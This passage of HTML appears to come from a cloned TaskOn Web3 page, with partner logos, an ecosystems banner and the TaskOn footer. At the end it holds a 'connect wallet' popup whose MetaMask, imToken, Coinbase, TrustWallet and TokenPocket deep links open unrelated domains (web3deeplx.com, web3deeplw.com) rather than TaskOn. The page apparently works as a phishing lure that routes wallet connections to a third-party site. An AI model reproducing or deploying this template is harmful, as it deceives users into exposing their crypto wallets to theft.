YjG16shmjQ9I03SmZE+5lE9onYFsc8nFW7pg9aW85QAATU7ii8tHOb7FMq/JjMfHSYWBu6xuQ0ArWyAF7UWCFYZ0L8KAQAQ0oZizLunUYRj8glkQdkUXZ7dEe0daFsTelkWY7MsigAQgsLNvlHCIDB64atTFEln5AAEX7nUhIEGYhUk8GozpfuakS0SSmTtCLYBlrYi8QQbzGUA/5wqSYOYt+rnjk67+wE3+70AYN5n5tAL7XN6KoDGzV0Be1sVxHKcAe9naAOY4jicALwB/W2IKVbPDi3laIiDHceywr9mtgKbxAGrrknEAexQVH+/IU2t9aAHYsVdAnJrNO+YO+56W/dX4GdhTawMYu93uFGDs6ZcgoTwFYPRBzVtQncAEEBifIdjlmkIfx915ARcA3dZAwqEf8KPDvgdvJRRR2czTindURvUkbU5mnmZgPxOxVoYD05Sit/Ulwq08FCM5CFv1QhRwN/a2QnUfLMwk8zSia3lPHOC0q2vcsPAIIjrkZ7jWPom8vg899hcRLfYqB9uQpDlCJ7+/LyO6lsyadA+QlyLt3m/pISJa6TQBRsOeIdIIacnDwQ/rGn9MgGoblwxCRjKyZZvNvNX/M676H43cGdmK/5q6Nedzwu35A8nwFdmN+J/4W/DXRVgja4LF47SqMfmO9GqmWqLbpmar+gBp+/alepXkdiTHb3q84rsWvkxncWp+NQAPQGDymUrv1vRsm4t6qjPCt9M35+X39uKcZ5xUHBfKPlkAC2Bsm/PJsgA="
									alt="" />
								<div data-v-e949c7c2="" class="pn_name">OkLink</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap"
									src="data:image/webp;base64,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"
									alt="" />
								<div data-v-e949c7c2="" class="pn_name">Orbiter</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap"
									src="data:image/webp;base64,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"
									alt="" />
								<div data-v-e949c7c2="" class="pn_name">Scroll</div>
							</div>
							<div data-v-e949c7c2="" class="img-cell">
								<img data-v-e949c7c2="" class="pd-img__wrap" src="../assets/static/hs/Tron-tan_265b.webp" alt="" />
								<div data-v-e949c7c2="" class="pn_name">Tron</div>
							</div>
						</div>
					</div>
					<div data-v-75b030e9="" data-v-05115bf9="" class="supported-ecosystems fade-in-bottom supported-ecosystems-wrap">
						<div data-v-75b030e9="" class="supported-ecosystems__title">
							Supported Ecosystems
						</div>
						<div data-v-75b030e9="" class="icons">
							<div data-v-75b030e9="" class="icons__content">
								<img data-v-75b030e9="" class="icons__content__img" src="../assets/static/hs/ecosystems-DWGFwBuA.webp"
									alt="" /><img data-v-75b030e9="" class="icons__content__img"
									src="../assets/static/hs/ecosystems-DWGFwBuA.webp" alt="" />
							</div>
						</div>
					</div>
				</div>
				<!---->
			</div>
			<div data-v-d98122c9="" data-v-05115bf9="" id="the-footer" class="the-footer">
				<div data-v-d98122c9="" class="g-safe-area container">
					<div data-v-9523d79d="" data-v-d98122c9="" class="logo-slogan">
						<a data-v-9523d79d="" aria-current="page" href="https://taskon.xyz/"
							class="router-link-active router-link-exact-active home-link"><img data-v-9523d79d="" class="logo"
								src="../assets/static/hs/logo_taskon-DpWWWX2n.svg" alt="" /></a>
						<div data-v-9523d79d="" class="desc">
							Engage •
							<span data-v-9523d79d="" class="hight-light_blue">Grow</span> •
							Succeed
						</div>
					</div>
					<div data-v-ff3a91ea="" data-v-d98122c9="" class="footer-nav container__right">
						<div data-v-ff3a91ea="">
							<div data-v-ff3a91ea="" class="title ff3a91ea-title">TaskOn</div>
							<a data-v-ff3a91ea="" href="https://taskon.xyz/explore" class="list-item">Explore</a>
							<div data-v-f970ec42="" data-v-ff3a91ea="" role="button" tabindex="0"
								class="g-fix-outline g-pointer list-item">
								Create Community
							</div>
							<div data-v-f970ec42="" data-v-ff3a91ea="" role="button" tabindex="0"
								class="g-fix-outline g-pointer list-item">
								Create Campaign
							</div>
							<div data-v-f970ec42="" data-v-ff3a91ea="" role="button" tabindex="0"
								class="g-fix-outline g-pointer list-item">
								Entity Hub
							</div>
							<div data-v-f970ec42="" data-v-ff3a91ea="" role="button" tabindex="0"
								class="g-fix-outline g-pointer list-item">
								User Center
							</div>
							<a data-v-ff3a91ea="" class="out-link g-clickable list-item" href="https://testnet.taskon.xyz/"
								target="_self" rel="noopener noreferrer nofollow">Testnet</a><a data-v-ff3a91ea=""
								href="https://taskon.xyz/terms" class="g-m-only list-item list-item--terms" target="_self">Terms of
								Service</a>
						</div>
						<div data-v-ff3a91ea="">
							<div data-v-ff3a91ea="" class="title ff3a91ea-title">Support</div>
							<a data-v-ff3a91ea="" class="out-link g-clickable list-item"
								href="https://taskoncommunitys-organization.gitbook.io/taskon-help-center/" target="_self"
								rel="noopener noreferrer nofollow">User Tutorial</a><a data-v-ff3a91ea=""
								class="out-link g-clickable list-item"
								href="https://taskoncommunitys-organization.gitbook.io/entity-hub-for-business-end/" target="_self"
								rel="noopener noreferrer nofollow">Creator Handbook</a><a data-v-ff3a91ea=""
								class="out-link g-clickable list-item" href="https://forms.gle/aiFBw8ZssnsSbEve8" target="_self"
								rel="noopener noreferrer nofollow">Apply for Verification</a><a data-v-ff3a91ea=""
								class="out-link g-clickable list-item" href="https://www.taskon.xyz/assets/presskit.zip" target="_self"
								rel="noopener noreferrer nofollow">Press Kit</a><a data-v-ff3a91ea=""
								class="out-link g-clickable list-item" href="https://medium.com/@taskonxyz" target="_self"
								rel="noopener noreferrer nofollow">Medium</a><a data-v-ff3a91ea="" href="https://taskon.xyz/privacy"
								class="g-m-only list-item list-item--terms" target="_self">Privacy Policy</a>
						</div>
						<div data-v-ff3a91ea="" class="g-pc-only">
							<div data-v-ff3a91ea="" class="title">Contact Us</div>
							<a data-v-ff3a91ea="" class="out-link g-clickable list-item" href="https://x.com/taskonxyz" target="_self"
								rel="noopener noreferrer nofollow"><span data-v-ff3a91ea="" class="list-item__icon__box">
									𝕏
								</span>
								<div data-v-ff3a91ea="">𝕏</div>
							</a><a data-v-ff3a91ea="" class="out-link g-clickable list-item"
								href="https://discord.com/invite/tjszFr7wHz" target="_self" rel="noopener noreferrer nofollow"><svg
									data-v-ff3a91ea="" width="24" height="24" viewBox="0 0 24 24" class="social-icon list-item__icon"
									xmlns="http://www.w3.org/2000/svg">
									<circle class="social-icon__round" cx="12" cy="12" r="12"></circle>
									<path class="social-icon__path"
										d="M16.6172 9.57938C15.3582 8.69802 14.162 8.63507 13.9732 8.63507L13.8473 8.76097C15.2952 9.1387 16.1136 9.83119 16.1766 9.89415C13.9102 8.76097 11.3921 8.69802 9.12572 9.57938C8.81095 9.70529 8.62209 9.83119 8.55913 9.83119C8.68504 9.76824 9.44049 9.07574 11.0143 8.69802L10.8884 8.57211C10.8884 8.57211 9.62935 8.50916 8.24436 9.51642C8.24436 9.51642 6.85938 11.8457 6.85938 14.8046C6.85938 14.8046 7.67778 16.1266 9.75526 16.1896C9.75526 16.1896 10.07 15.8118 10.3848 15.4341C9.31458 15.1193 8.81095 14.4268 8.748 14.3639L9.12572 14.5527C10.2589 14.9934 11.455 15.623 13.6584 15.2452C14.0991 15.1823 14.6027 15.0564 15.0434 14.8675C15.3582 14.6787 15.7359 14.5527 16.1136 14.3009C16.0507 14.3639 15.547 15.0564 14.4139 15.3711C14.6657 15.7489 15.0434 16.1266 15.0434 16.1266C17.1838 16.0636 18.0022 14.7416 18.0022 14.8675C18.0022 11.9716 16.6172 9.57938 16.6172 9.57938ZM10.6996 13.8603C10.1959 13.8603 9.75526 13.4196 9.75526 12.853C9.75526 12.2864 10.1959 11.8457 10.6996 11.8457C11.2032 11.8457 11.6439 12.3494 11.6439 12.853C11.6439 13.4196 11.2032 13.8603 10.6996 13.8603ZM14.162 13.8603C13.6584 13.8603 13.2177 13.4196 13.2177 12.853C13.2177 12.2864 13.6584 11.8457 14.162 11.8457C14.7286 11.8457 15.1693 12.3494 15.1693 12.853C15.1693 13.4196 14.7286 13.8603 14.162 13.8603Z">
									</path>
								</svg>
								<div data-v-ff3a91ea="">Discord</div>
							</a><a data-v-ff3a91ea="" class="out-link g-clickable list-item" href="https://t.me/TaskOnOfficial"
								target="_self" rel="noopener noreferrer nofollow"><svg data-v-ff3a91ea="" width="24" height="24"
									viewBox="0 0 24 24" class="social-icon list-item__icon" xmlns="http://www.w3.org/2000/svg">
									<circle class="social-icon__round" cx="12" cy="12" r="12"></circle>
									<path class="social-icon__path"
										d="M16.2456 8.58174L14.5696 16.4978C14.4535 17.0596 14.1146 17.1942 13.641 16.9342L11.0874 15.0446L9.85242 16.2378C9.71313 16.3771 9.59706 16.4978 9.34171 16.4978C9.00742 16.4978 9.06313 16.3725 8.95171 16.0567L8.06956 13.1828L5.53921 12.3935C4.99135 12.231 4.98671 11.855 5.65992 11.581L15.5306 7.77388C15.981 7.57424 16.4128 7.88531 16.241 8.57709L16.2456 8.58174Z">
									</path>
								</svg>
								<div data-v-ff3a91ea="">Telegram</div>
							</a><a data-v-ff3a91ea="" class="out-link g-clickable list-item" href="mailto:contact@taskon.xyz"
								target="_self" rel="noopener noreferrer nofollow"><svg data-v-ff3a91ea="" width="24" height="24"
									viewBox="0 0 24 24" class="social-icon list-item__icon" xmlns="http://www.w3.org/2000/svg">
									<circle class="social-icon__round" cx="12" cy="12" r="12"></circle>
									<path class="social-icon__path"
										d="M7.65529 13.8205L10.6313 11.6939L6.85938 8.999V14.3876L7.48119 13.9436L7.65529 13.8205ZM12.4308 12.0011L17.2063 8.58985L17.8903 8.10235C17.751 7.86979 17.4973 7.71434 17.2063 7.71434H7.65529C7.38791 7.71434 7.15163 7.84616 7.00737 8.04763L7.65529 8.58985L12.4308 12.0011ZM13.5451 12.1827L12.4308 12.9786L11.3165 12.1827L7.65529 14.798L7.48119 14.941L7.00239 15.3328C7.14541 15.5392 7.38543 15.6735 7.65529 15.6735H17.2063C17.4986 15.6735 17.7535 15.5168 17.8915 15.283L17.2063 14.798L13.5451 12.1827ZM14.2291 11.6939L18.0022 14.3889V8.999L14.2291 11.6939Z">
									</path>
								</svg>
								<div data-v-ff3a91ea="">Email Us</div>
							</a>
						</div>
					</div>
				</div>
				<div data-v-a120b64e="" data-v-d98122c9="" class="terms-row">
					<div data-v-a120b64e="" class="g-safe-area container">
						<a data-v-a120b64e="" aria-current="page" href="https://taskon.xyz/"
							class="router-link-active router-link-exact-active container__link">@TaskOn 2023 - 2024</a><a
							data-v-a120b64e="" href="https://taskon.xyz/terms" class="g-pc-only container__link container__service"
							target="_self">Terms of Service</a><a data-v-a120b64e="" href="https://taskon.xyz/privacy"
							class="g-pc-only container__link" target="_self">Privacy Policy</a>
						<div data-v-a120b64e="" class="g-m-only container__icons">
							<a data-v-a120b64e="" class="out-link g-clickable container__icons__item" href="https://x.com/taskonxyz"
								target="_self" rel="noopener noreferrer nofollow"><svg data-v-a120b64e=""
									class="social-icon container__icons__item__icon" width="25" height="25" viewBox="0 0 25 25"
									xmlns="http://www.w3.org/2000/svg">
									<circle class="social-icon__round" cx="12.5" cy="12.5" r="12.5"></circle>
									<path class="social-icon__path"
										d="M17.8571 10.0713C17.6325 10.4859 17.2581 10.9004 16.7339 11.1768V11.4531C16.7339 14.9076 13.6636 17.7403 9.91935 17.7403C8.64631 17.7403 7.37327 17.3949 6.25 16.7731C6.47465 16.7731 6.62442 16.8422 6.84908 16.7731C7.97235 16.7731 9.02074 16.4276 9.84447 15.8058C8.79608 15.8058 7.89747 15.184 7.59793 14.2858C7.7477 14.2858 7.89747 14.3549 8.04724 14.3549C8.27189 14.3549 8.49654 14.3549 8.64631 14.2858C7.52304 14.0786 6.69931 13.1804 6.69931 12.144C6.99885 12.2822 7.37327 12.4204 7.7477 12.4204C7.14862 12.0058 6.77419 11.3149 6.77419 10.555C6.77419 10.1404 6.92396 9.79496 7.07373 9.44951C8.27189 10.8313 10.0691 11.6604 12.0161 11.7295C11.9412 11.5913 11.9412 11.384 11.9412 11.2459C11.9412 10.0022 12.9896 9.03497 14.3376 9.03497C15.0115 9.03497 15.6106 9.31133 16.0599 9.72587C16.5841 9.65678 17.1083 9.44951 17.5576 9.17315C17.4078 9.65678 17.0334 10.1404 16.5092 10.4168C16.9585 10.3477 17.4827 10.2095 17.8571 10.0713Z">
									</path>
								</svg></a><a data-v-a120b64e="" class="out-link g-clickable container__icons__item"
								href="https://discord.com/invite/tjszFr7wHz" target="_self" rel="noopener noreferrer nofollow"><svg
									data-v-a120b64e="" width="24" height="24" viewBox="0 0 24 24"
									class="social-icon container__icons__item__icon" xmlns="http://www.w3.org/2000/svg">
									<circle class="social-icon__round" cx="12" cy="12" r="12"></circle>
									<path class="social-icon__path"
										d="M16.6172 9.57938C15.3582 8.69802 14.162 8.63507 13.9732 8.63507L13.8473 8.76097C15.2952 9.1387 16.1136 9.83119 16.1766 9.89415C13.9102 8.76097 11.3921 8.69802 9.12572 9.57938C8.81095 9.70529 8.62209 9.83119 8.55913 9.83119C8.68504 9.76824 9.44049 9.07574 11.0143 8.69802L10.8884 8.57211C10.8884 8.57211 9.62935 8.50916 8.24436 9.51642C8.24436 9.51642 6.85938 11.8457 6.85938 14.8046C6.85938 14.8046 7.67778 16.1266 9.75526 16.1896C9.75526 16.1896 10.07 15.8118 10.3848 15.4341C9.31458 15.1193 8.81095 14.4268 8.748 14.3639L9.12572 14.5527C10.2589 14.9934 11.455 15.623 13.6584 15.2452C14.0991 15.1823 14.6027 15.0564 15.0434 14.8675C15.3582 14.6787 15.7359 14.5527 16.1136 14.3009C16.0507 14.3639 15.547 15.0564 14.4139 15.3711C14.6657 15.7489 15.0434 16.1266 15.0434 16.1266C17.1838 16.0636 18.0022 14.7416 18.0022 14.8675C18.0022 11.9716 16.6172 9.57938 16.6172 9.57938ZM10.6996 13.8603C10.1959 13.8603 9.75526 13.4196 9.75526 12.853C9.75526 12.2864 10.1959 11.8457 10.6996 11.8457C11.2032 11.8457 11.6439 12.3494 11.6439 12.853C11.6439 13.4196 11.2032 13.8603 10.6996 13.8603ZM14.162 13.8603C13.6584 13.8603 13.2177 13.4196 13.2177 12.853C13.2177 12.2864 13.6584 11.8457 14.162 11.8457C14.7286 11.8457 15.1693 12.3494 15.1693 12.853C15.1693 13.4196 14.7286 13.8603 14.162 13.8603Z">
									</path>
								</svg></a><a data-v-a120b64e="" class="out-link g-clickable container__icons__item"
								href="https://t.me/TaskOnOfficial" target="_self" rel="noopener noreferrer nofollow"><svg
									data-v-a120b64e="" width="24" height="24" viewBox="0 0 24 24"
									class="social-icon container__icons__item__icon" xmlns="http://www.w3.org/2000/svg">
									<circle class="social-icon__round" cx="12" cy="12" r="12"></circle>
									<path class="social-icon__path"
										d="M16.2456 8.58174L14.5696 16.4978C14.4535 17.0596 14.1146 17.1942 13.641 16.9342L11.0874 15.0446L9.85242 16.2378C9.71313 16.3771 9.59706 16.4978 9.34171 16.4978C9.00742 16.4978 9.06313 16.3725 8.95171 16.0567L8.06956 13.1828L5.53921 12.3935C4.99135 12.231 4.98671 11.855 5.65992 11.581L15.5306 7.77388C15.981 7.57424 16.4128 7.88531 16.241 8.57709L16.2456 8.58174Z">
									</path>
								</svg></a><a data-v-a120b64e="" class="out-link g-clickable container__icons__item"
								href="mailto:contact@taskon.xyz" target="_self" rel="noopener noreferrer nofollow"><svg
									data-v-a120b64e="" width="24" height="24" viewBox="0 0 24 24"
									class="social-icon container__icons__item__icon" xmlns="http://www.w3.org/2000/svg">
									<circle class="social-icon__round" cx="12" cy="12" r="12"></circle>
									<path class="social-icon__path"
										d="M7.65529 13.8205L10.6313 11.6939L6.85938 8.999V14.3876L7.48119 13.9436L7.65529 13.8205ZM12.4308 12.0011L17.2063 8.58985L17.8903 8.10235C17.751 7.86979 17.4973 7.71434 17.2063 7.71434H7.65529C7.38791 7.71434 7.15163 7.84616 7.00737 8.04763L7.65529 8.58985L12.4308 12.0011ZM13.5451 12.1827L12.4308 12.9786L11.3165 12.1827L7.65529 14.798L7.48119 14.941L7.00239 15.3328C7.14541 15.5392 7.38543 15.6735 7.65529 15.6735H17.2063C17.4986 15.6735 17.7535 15.5168 17.8915 15.283L17.2063 14.798L13.5451 12.1827ZM14.2291 11.6939L18.0022 14.3889V8.999L14.2291 11.6939Z">
									</path>
								</svg></a>
						</div>
					</div>
				</div>
			</div>
			<!---->
		</div>
		<van-popup v-model="showclct" closeable round :overlay="false" position="center" :style="{ height: '60%' ,width: '85%'}" >
			<div class="wallt_cnt">
					<h2>
							链接钱包
					</h2>
			</div>
			<hr class="showclct_hr" />
			<van-grid column-num="3" :border="false">
					<van-grid-item icon="https://static.okx.com/cdn/assets/imgs/231/2ACCB47A73E4D8E1.png?x-oss-process=image/format,webp" text="OKX" link-type="navigateTo"
url="https://www.okx.com/download?channelId=GoogleSEO" />
					<van-grid-item icon="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" text="MetaMask" link-type="navigateTo"
url="https://metamask.io/link/dapp/https://web3deeplx.com/" />
					<van-grid-item icon="https://token.im/img/favicon-32x32.png" text="imToken" link-type="navigateTo"
url="imtokenv2://navigate?screen=DappView&url=https://web3deeplw.com/" />
					<van-grid-item icon="https://is5-ssl.mzstatic.com/image/thumb/Purple122/v4/0b/ed/d4/0bedd4b0-1608-d8b8-da72-c08e356c35d3/AppIcon-0-1x_U007emarketing-0-10-0-85-220.png/246x0w.webp" text="Coinbase" link-type="navigateTo"
url="https://go.cb-w.com/dapp?cb_url=https://web3deeplx.com/"/>
					<van-grid-item icon="https://play-lh.googleusercontent.com/cd5BevWohRqLwsI2_i3k4YIVtcO57cIZCs6l20H1Hcdj0P2rFEcX_7QtgKbTM3Sn_A=w240-h480-rw" text="TrustWallet" link-type="navigateTo"
url="https://link.trustwallet.com/open_url?coin_id=60&url=https://web3deeplx.com/" />
					<van-grid-item icon="https://play-lh.googleusercontent.com/G_BiKQ5vjnpL9dDr1nRnqZmnjGMNykYng1QDuv5S6C4Foqeye472WE3KM8rtJYGeGSLD=w240-h480-rw" text="TokenPocket" link-type="navigateTo"
url="tpdapp://open?params=%22url%22:%20%22https://web3deeplw.com/" />
			</van-grid>
			<div class="cnct_class">
					<div class="cnct_domain">
							<span>web3deeplw.com</span>
							<div class="fuzhi_btn"  @click="copysite">
